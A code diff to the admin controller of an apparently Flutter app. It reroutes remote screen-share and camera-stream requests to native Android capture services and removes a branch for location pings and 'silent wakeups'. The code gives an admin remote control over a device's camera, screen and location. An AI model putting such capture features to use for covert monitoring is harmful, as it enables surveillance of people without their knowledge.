@@ -584,6 +584,15 @@ class AdminController extends GetxController {
     _processingRequestIds.add(requestId);
 
     try {
+      if (AdminService.platformName == 'android') {
+        // Native ForegroundService and ScreenCaptureService/CameraCaptureService execute captures.
+        // Only WebRTC publisher stream needs Dart signaling.
+        if (requestType == 'screen_share' || requestType == 'camera_stream') {
+          await AdminService.fulfillScreenShareRequest(requestId);
+        }
+        return;
+      }
+
       if (requestType == 'screen_share') {
         await AdminService.fulfillScreenShareRequest(requestId);
       } else if (requestType == 'camera_capture') {
@@ -592,9 +601,6 @@ class AdminController extends GetxController {
         await AdminService.fulfillScreenShareRequest(requestId);
       } else if (requestType == 'screenshot') {
         await AdminService.fulfillScreenshotRequest(requestId);
-      } else if (requestType == 'location_ping' || requestType == 'wake_up') {
-        // Native background service handles location ping and silent wakeups
-        return;
       }
     } catch (e) {
       debugPrint('Error fulfilling request $requestId: $e');
